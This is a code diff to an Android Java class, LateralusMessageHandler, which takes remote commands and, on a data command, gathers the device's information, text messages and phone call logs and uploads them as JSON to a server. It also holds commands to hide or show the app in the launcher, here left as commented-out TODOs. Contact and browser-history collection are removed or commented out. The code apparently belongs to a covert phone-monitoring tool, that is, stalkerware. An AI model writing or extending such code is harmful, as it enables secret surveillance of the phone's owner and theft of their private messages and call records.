@@ -1,18 +1,16 @@
-package net.scottjulian.lateralus;
+package net.scottjulian.lateralus.components;
 
 
 import android.content.Context;
 import android.location.Location;
 import android.util.Log;
 
-import net.scottjulian.lateralus.components.DeviceController;
 import net.scottjulian.lateralus.components.location.LocDelegate;
 import net.scottjulian.lateralus.components.location.LocationReader;
 import net.scottjulian.lateralus.components.network.Network;
-import net.scottjulian.lateralus.components.readers.ContactReader;
 import net.scottjulian.lateralus.components.readers.DataReader;
 import net.scottjulian.lateralus.components.readers.DeviceReader;
-import net.scottjulian.lateralus.components.readers.InternetHistoryReader;
+//import net.scottjulian.lateralus.components.readers.InternetHistoryReader;
 import net.scottjulian.lateralus.components.readers.PhonecallReader;
 import net.scottjulian.lateralus.components.readers.TextMessageReader;
 
@@ -62,10 +60,12 @@ public class LateralusMessageHandler {
                     cmdLocation(cmd);
                     break;
                 case CMD_HIDE_APP:
-                    DeviceController.hideAppInDrawer(_ctx);
+                    //TODO
+                    //Utils.hideAppInDrawer(_ctx);
                     break;
                 case CMD_SHOW_APP:
-                    DeviceController.showAppInDrawer(_ctx);
+                    // TODO
+                    //Utils.showAppInDrawer(_ctx);
                     break;
                 default:
                     Log.e(TAG, "Invalid Command: " + cmd);
@@ -80,30 +80,32 @@ public class LateralusMessageHandler {
 
     private void cmdData(){
         try{
-            JSONArray jsonArray = new JSONArray();
+            JSONArray array = new JSONArray();
+
             // device
             DataReader dr = new DeviceReader(_ctx);
-            jsonArray.put(dr.getData());
+            array.put(dr.getData());
+
             // text messages
             dr = new TextMessageReader(_ctx);
-            jsonArray.put(dr.getData());
-            // contacts
-            dr = new ContactReader(_ctx);
-            jsonArray.put(dr.getData());
-            // phonecalls
+            array.put(dr.getData());
+
+            // phone calls
             dr = new PhonecallReader(_ctx);
-            jsonArray.put(dr.getData());
+            array.put(dr.getData());
+
             // internet history
-            dr = new InternetHistoryReader(_ctx);
-            jsonArray.put(dr.getData());
-            // make JSONObject
-            JSONObject root = new JSONObject();
-            root.put(KEY_ROOT, jsonArray);
+            //dr = new InternetHistoryReader(_ctx);
+            //array.put(dr.getData());
+
             // fire data
+            JSONObject root = new JSONObject().put(KEY_ROOT, array);
             Network.fireJsonData(_ctx, Network.API_PUT, root);
         }
         catch(Exception e){
-
+            Log.e(TAG, "Error creating data for cmd_data");
+            e.printStackTrace();
+            //TODO: send error message?
         }
     }
 
